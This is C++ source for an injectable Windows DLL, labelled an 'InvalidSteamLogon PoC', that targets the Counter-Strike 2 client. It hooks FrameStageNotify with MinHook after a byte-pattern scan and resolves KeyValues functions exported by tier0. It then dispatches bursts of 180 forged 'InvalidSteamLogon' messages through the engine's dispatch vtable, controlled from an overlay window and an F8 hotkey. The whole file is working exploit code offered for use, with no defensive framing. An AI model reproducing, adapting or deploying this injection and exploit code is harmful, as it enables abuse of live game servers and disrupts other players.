#include <windows.h>
#include <windowsx.h>
#include <cstdio>
#include <cstdint>

#include "scan.h"
#include "MinHook.h"

// ── KV types ──
using KVNewFn    = void* (__fastcall*)(size_t);
using KVCtorFn   = void* (__fastcall*)(void*, const char*, void*, bool);
using KVSetIntFn = void  (__fastcall*)(void*, const char*, int);
using KVDtorFn   = void  (__fastcall*)(void*);
using DispatchFn = void  (__fastcall*)(void*, void*);
using CreateInterfaceFn = void* (*)(const char*, int*);

// ── Globals ──
static HMODULE g_client = nullptr;

static KVNewFn    g_kvNew    = nullptr;
static KVCtorFn   g_kvCtor   = nullptr;
static KVSetIntFn g_kvSetInt = nullptr;
static KVDtorFn   g_kvDtor   = nullptr;
static DispatchFn g_dispatch = nullptr;
static void*      g_engine   = nullptr;

static const uintptr_t kDispatchVtOffset = 0x3B8;

using FSNFn = void(__fastcall*)(void*, int);
static FSNFn g_origFSN = nullptr;

// ── State ──
static volatile bool g_exploitOn = false;
static volatile long g_remaining = 0;
static volatile long g_totalSends = 0;

// ── Overlay window ──
static HWND   g_overlay  = nullptr;
static HWND   g_cs2      = nullptr;
static HFONT  g_fontTitle, g_fontText;
static int    g_ovW = 260, g_ovH = 92;
static bool   g_drag = false;
static POINT  g_dragPt;

// checkbox + button rects (client coords of overlay)
static RECT g_chkBox = { 18, 46, 30, 58 };
static RECT g_btnBox = { 18, 66, g_ovW - 18, 84 };

// ── KV helpers ──
static void* GetEngine()
{
    HMODULE e2 = GetModuleHandleA("engine2.dll");
    if (!e2) return nullptr;
    auto ci = (CreateInterfaceFn)GetProcAddress(e2, "CreateInterface");
    return ci ? ci("Source2EngineToClient001", nullptr) : nullptr;
}

static bool ResolveKV()
{
    g_engine = GetEngine();
    if (!g_engine) { printf("[!] no engine interface\n"); return false; }
    g_dispatch = *(DispatchFn*)(*(char**)g_engine + kDispatchVtOffset);

    HMODULE t0 = GetModuleHandleA("tier0.dll");
    if (!t0) { printf("[!] no tier0\n"); return false; }

    g_kvNew    = (KVNewFn)   GetProcAddress(t0, "??2KeyValues@@SAPEAX_K@Z");
    g_kvCtor   = (KVCtorFn)  GetProcAddress(t0, "??0KeyValues@@QEAA@PEBDPEAVIKeyValuesSystem@@_N@Z");
    g_kvSetInt = (KVSetIntFn)GetProcAddress(t0, "?SetInt@KeyValues@@QEAAXPEBDH@Z");
    g_kvDtor   = (KVDtorFn)  GetProcAddress(t0, "??1KeyValues@@QEAA@XZ");

    if (!g_kvNew)    g_kvNew    = (KVNewFn)GetProcAddress(t0, "??2KeyValues@@SAPEAX_KHPEBDH@Z");
    if (!g_kvSetInt) g_kvSetInt = (KVSetIntFn)GetProcAddress(t0, "?SetInt@KeyValues@@QAEXPEBDH@Z");
    if (!g_kvDtor)   g_kvDtor   = (KVDtorFn)GetProcAddress(t0, "??1KeyValues@@QAEXXZ");

    if (!g_kvNew || !g_kvCtor || !g_kvSetInt || !g_kvDtor)
    {
        printf("[!] KV not resolved: new=%p ctor=%p set=%p dtor=%p\n",
               g_kvNew, g_kvCtor, g_kvSetInt, g_kvDtor);
        return false;
    }
    printf("[+] engine=%p  dispatch=%p\n", g_engine, g_dispatch);
    printf("[+] KV new=%p ctor=%p setint=%p dtor=%p\n",
           g_kvNew, g_kvCtor, g_kvSetInt, g_kvDtor);
    return true;
}

static void SendExploit(int reason)
{
    if (!g_engine || !g_dispatch || !g_kvNew || !g_kvCtor || !g_kvSetInt || !g_kvDtor)
        return;
    void* kv = g_kvNew(0x1C);
    if (kv)
    {
        g_kvCtor(kv, "InvalidSteamLogon", nullptr, false);
        g_kvSetInt(kv, "reason", reason);
        g_dispatch(g_engine, kv);
        InterlockedIncrement(&g_totalSends);
        g_kvDtor(kv);
    }
}

// ── FSN hook (runs on game thread) ──
static void __fastcall HookFSN(void* inst, int stage)
{
    g_origFSN(inst, stage);

    if (g_exploitOn && g_remaining > 0)
    {
        SendExploit(13);
        InterlockedDecrement(&g_remaining);
    }
}

// ── Overlay painting ──
static void Repaint();

static void ToggleExploit()
{
    g_exploitOn = !g_exploitOn;
    if (g_exploitOn)
    {
        g_remaining = 180;
        g_totalSends = 0;
        printf("[*] EXPLOIT ON, burst armed %ld\n", g_remaining);
    }
    else
    {
        g_remaining = 0;
        printf("[*] EXPLOIT OFF (dispatched %ld total)\n", g_totalSends);
    }
    Repaint();
}

static void FireBurst()
{
    g_exploitOn = true;
    g_remaining = 180;
    g_totalSends = 0;
    printf("[*] BURST FIRED (180 sends)\n");
    Repaint();
}

static void PaintOverlay(HDC hdc)
{
    RECT rcClient = { 0, 0, g_ovW, g_ovH };

    // background
    HBRUSH bg = CreateSolidBrush(RGB(16, 16, 20));
    FillRect(hdc, &rcClient, bg);
    DeleteObject(bg);

    // title bar
    RECT title = { 0, 0, g_ovW, 30 };
    HBRUSH tb = CreateSolidBrush(RGB(30, 30, 36));
    FillRect(hdc, &title, tb);
    DeleteObject(tb);

    // border
    HPEN pen = CreatePen(PS_SOLID, 1, RGB(80, 80, 90));
    HGDIOBJ oldPen = SelectObject(hdc, pen);
    HGDIOBJ oldBr = SelectObject(hdc, GetStockObject(NULL_BRUSH));
    Rectangle(hdc, 0, 0, g_ovW, g_ovH);
    SelectObject(hdc, oldBr);
    SelectObject(hdc, oldPen);
    DeleteObject(pen);

    // title
    SetBkMode(hdc, TRANSPARENT);
    SetTextColor(hdc, RGB(235, 235, 240));
    HGDIOBJ oldF = SelectObject(hdc, g_fontTitle);
    TextOutA(hdc, 10, 6, "InvalidSteamLogon", 17);
    SelectObject(hdc, oldF);

    // checkbox
    HBRUSH chkBg = CreateSolidBrush(g_exploitOn ? RGB(0, 140, 210) : RGB(60, 60, 70));
    FillRect(hdc, &g_chkBox, chkBg);
    DeleteObject(chkBg);

    // label
    SelectObject(hdc, g_fontText);
    SetTextColor(hdc, RGB(200, 200, 210));
    char label[96];
    snprintf(label, sizeof(label), "Exploit: %s   (sent %ld)",
             g_exploitOn ? "ON" : "OFF", g_totalSends);
    TextOutA(hdc, 36, 45, label, (int)strlen(label));

    // button
    HBRUSH btn = CreateSolidBrush(RGB(40, 40, 48));
    FillRect(hdc, &g_btnBox, btn);
    DeleteObject(btn);

    SetTextColor(hdc, RGB(220, 220, 230));
    char btnLabel[64];
    snprintf(btnLabel, sizeof(btnLabel), "FIRE BURST (F8)  left=%ld", g_remaining);
    TextOutA(hdc, 22, 67, btnLabel, (int)strlen(btnLabel));

    // footer hint
    SetTextColor(hdc, RGB(120, 120, 130));
    TextOutA(hdc, 10, g_ovH - 22, "Drag title to move.  HOME to close.", 34);
}

static void Repaint()
{
    if (!g_overlay) return;
    InvalidateRect(g_overlay, nullptr, FALSE);
}

static LRESULT CALLBACK OverlayWndProc(HWND hwnd, UINT msg, WPARAM wp, LPARAM lp)
{
    switch (msg)
    {
    case WM_PAINT:
    {
        PAINTSTRUCT ps;
        HDC hdc = BeginPaint(hwnd, &ps);
        PaintOverlay(hdc);
        EndPaint(hwnd, &ps);
        return 0;
    }
    case WM_LBUTTONDOWN:
    {
        POINT pt = { GET_X_LPARAM(lp), GET_Y_LPARAM(lp) };
        if (pt.x >= 0 && pt.x < g_ovW && pt.y >= 0 && pt.y < 30)   // title bar
        {
            g_drag = true;
            SetCapture(hwnd);
            g_dragPt = pt;
            return 0;
        }
        if (pt.x >= g_chkBox.left && pt.x <= g_chkBox.right &&
            pt.y >= g_chkBox.top && pt.y <= g_chkBox.bottom)
        {
            ToggleExploit();
            Repaint();
            return 0;
        }
        if (pt.x >= g_btnBox.left && pt.x <= g_btnBox.right &&
            pt.y >= g_btnBox.top && pt.y <= g_btnBox.bottom)
        {
            FireBurst();
            Repaint();
            return 0;
        }
        return 0;
    }
    case WM_MOUSEMOVE:
        if (g_drag && (wp & MK_LBUTTON))
        {
            POINT pt = { GET_X_LPARAM(lp), GET_Y_LPARAM(lp) };
            POINT cur;
            GetCursorPos(&cur);
            RECT r;
            GetWindowRect(hwnd, &r);
            SetWindowPos(hwnd, nullptr, cur.x - g_dragPt.x, cur.y - g_dragPt.y,
                         0, 0, SWP_NOSIZE | SWP_NOACTIVATE);
            return 0;
        }
        return 0;
    case WM_LBUTTONUP:
        if (g_drag) { g_drag = false; ReleaseCapture(); }
        return 0;
    case WM_KEYDOWN:
        if (wp == VK_HOME) { ShowWindow(hwnd, SW_HIDE); }
        return 0;
    case WM_NCHITTEST:
        return HTCLIENT;
    case WM_DESTROY:
        PostQuitMessage(0);
        return 0;
    }
    return DefWindowProcA(hwnd, msg, wp, lp);
}

// ── Overlay message pump thread ──
static DWORD WINAPI OverlayThreadProc(LPVOID)
{
    WNDCLASSEXA wc = {};
    wc.cbSize = sizeof(wc);
    wc.lpfnWndProc = OverlayWndProc;
    wc.hInstance = GetModuleHandleA(nullptr);
    wc.lpszClassName = "MiniExploitOverlay";
    wc.hCursor = LoadCursor(nullptr, IDC_ARROW);
    RegisterClassExA(&wc);

    DWORD style = WS_POPUP;
    DWORD exstyle = WS_EX_TOOLWINDOW | WS_EX_TOPMOST | WS_EX_LAYERED;

    g_cs2 = FindWindowA("SDL_app", nullptr);
    if (!g_cs2) g_cs2 = GetDesktopWindow();

    g_ovW = 320; g_ovH = 108;
    g_overlay = CreateWindowExA(exstyle, wc.lpszClassName, "Mini Exploit",
                                style, 20, 40, g_ovW, g_ovH,
                                g_cs2, nullptr, wc.hInstance, nullptr);

    SetLayeredWindowAttributes(g_overlay, RGB(16, 16, 20), 255, LWA_COLORKEY);

    g_fontTitle = CreateFontA(-15, 0, 0, 0, FW_BOLD, 0, 0, 0, ANSI_CHARSET,
                              0, 0, CLEARTYPE_QUALITY, 0, "Segoe UI");
    g_fontText = CreateFontA(-13, 0, 0, 0, FW_NORMAL, 0, 0, 0, ANSI_CHARSET,
                             0, 0, CLEARTYPE_QUALITY, 0, "Segoe UI");

    g_chkBox = { 18, 46, 30, 58 };
    g_btnBox = { 18, 66, g_ovW - 18, 84 };

    ShowWindow(g_overlay, SW_SHOW);

    MSG msg;
    while (GetMessageA(&msg, nullptr, 0, 0))
    {
        TranslateMessage(&msg);
        DispatchMessageA(&msg);
    }
    return 0;
}

static DWORD WINAPI PollThread(LPVOID)
{
    long lastPainted = 0;
    long lastTotal = 0;
    while (true)
    {
        if ((GetAsyncKeyState(VK_F8) & 1) && g_remaining <= 0)
        {
            FireBurst();
        }
        if (GetAsyncKeyState(VK_HOME) & 1)
        {
            if (g_overlay) ShowWindow(g_overlay, SW_SHOW);
        }

        // live-repaint the overlay so the sent/left counters visibly change
        {
            long t = g_totalSends;
            long r = g_remaining;
            if (t != lastTotal || r != lastPainted)
            {
                lastTotal = t;
                lastPainted = r;
                Repaint();
            }
        }

        Sleep(16);
    }
    return 0;
}

// ── Worker ──
static DWORD WINAPI Worker(LPVOID)
{
    g_client = GetModuleHandleA("client.dll");
    if (!g_client)
    {
        printf("[!] client.dll not loaded\n");
        return 0;
    }

    ResolveKV();

    void* fsn = scan::Pattern(g_client,
        "48 89 5C 24 ? 48 89 6C 24 ? 57 48 83 EC ? 48 8B F9 33 ED");

    MH_STATUS ms = MH_Initialize();
    if (ms != MH_OK && ms != MH_ERROR_ALREADY_INITIALIZED)
    {
        printf("[!] MinHook init failed: %d\n", ms);
        return 0;
    }

    if (fsn)
    {
        if (MH_CreateHook(fsn, &HookFSN, (void**)&g_origFSN) == MH_OK)
        {
            MH_EnableHook(fsn);
            printf("[+] FrameStageNotify hooked at %p\n", fsn);
        }
        else printf("[!] FSN hook failed\n");
    }
    else
    {
        printf("[!] FSN pattern not found - exploit will not fire\n");
    }

    printf("\n  ==========================================\n");
    printf("  Invalid Steam Logon Exploit\n");
    printf("  ==========================================\n");
    printf("  Overlay menu: drag title, click checkbox\n");
    printf("  F8 = fire burst (180 sends)\n");
    printf("  ==========================================\n\n");

    DWORD ovId = 0;
    HANDLE ov = CreateThread(nullptr, 0, OverlayThreadProc, nullptr, 0, &ovId);
    if (ov) CloseHandle(ov);

    while (true) Sleep(10000);   // keep worker alive

    return 0;
}

static DWORD WINAPI Shutdown(LPVOID)
{
    Sleep(2000);
    MH_DisableHook(MH_ALL_HOOKS);
    MH_Uninitialize();
    return 0;
}

BOOL APIENTRY DllMain(HMODULE mod, DWORD reason, LPVOID)
{
    if (reason == DLL_PROCESS_ATTACH)
    {
        DisableThreadLibraryCalls(mod);

        AllocConsole();
        FILE* f = nullptr;
        freopen_s(&f, "CONOUT$", "w", stdout);
        freopen_s(&f, "CONOUT$", "w", stderr);
        SetConsoleTitleA("InvalidSteamLogon PoC");

        printf("[*] loaded, client=%p\n", GetModuleHandleA("client.dll"));
        CreateThread(nullptr, 0, PollThread, nullptr, 0, nullptr);
        CreateThread(nullptr, 0, Worker, nullptr, 0, nullptr);
    }
    else if (reason == DLL_PROCESS_DETACH)
    {
        CreateThread(nullptr, 0, Shutdown, nullptr, 0, nullptr);
    }
    return TRUE;
}
